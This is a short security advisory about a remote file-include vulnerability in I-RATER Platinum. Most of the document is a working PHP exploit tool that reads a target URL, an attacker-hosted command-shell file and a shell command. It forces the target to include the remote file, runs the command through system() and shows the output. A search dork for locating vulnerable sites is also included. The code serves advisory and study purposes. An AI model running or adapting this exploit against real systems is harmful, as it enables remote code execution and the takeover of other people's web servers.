source: http://www.securityfocus.com/bid/17731/info

I-RATER Platinum is prone to a remote file-include vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.

An attacker can exploit this issue to include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process. This may allow the attacker to compromise the application and the underlying system; other attacks are also possible.

<?php
/*
I-RATER Platinum Remote File Inclusion exploit Cod3d by R@1D3N
Gr33t:Oulaw - A.u.r.a - drTp - Cl0wn - b3hzad - Str0ke and all Persian Cyb3r Team
Site:http://www.Aria-security.net
Dork:"Powered by I-RATER PLATINUM"

example:
target:http://www.site.com/admin/config_settings.tpl.php?include_path=
cmdshell:http://www.own3r.com/cmd.txt?

*/

$cmd = $_POST["cmd"];
$target = $_POST["target"];
$cmdshell = $_POST["cmdshell"];

$form= "<form method=\"post\" action=\"".$PHP_SELF."\">"
     ."target:<br><input type=\"text\" name=\"target\" size=\"90\"
value=\"".$target."\"><br>"
     ."cmdshell:<br><input type=\"text\" name=\"cmdshell\" size=\"90\"
value=\"".$cmdshell."\"><br>"
     ."cmd:<br><input type=\"text\" name=\"cmd\" size=\"90\"
value=\"".$cmd."\"><br>"
     ."<input type=\"submit\" value=\"Submit\" name=\"submit\">"

     ."</form><HR WIDTH=\"650\" ALIGN=\"LEFT\">";

if (!isset($_POST['submit']))
{

echo $form;

}else{

$file = fopen ("test.txt", "w+");

fwrite($file, "<?php system(\"echo ++BEGIN++\"); system(\"".$cmd."\");
system(\"echo ++END++\"); ?>");
fclose($file);

$file = fopen ($target.$cmdshell, "r");
if (!$file) {
     echo "<p>Unable to get output.\n";
     exit;
}

echo $form;

while (!feof ($file)) {
     $line .= fgets ($file, 1024)."<br>";
     }
$tpos1 = strpos($line, "++BEGIN++");
$tpos2 = strpos($line, "++END++");
$tpos1 = $tpos1+strlen("++BEGIN++");
$tpos2 = $tpos2-$tpos1;
$output = substr($line, $tpos1, $tpos2);
echo $output;

}
?>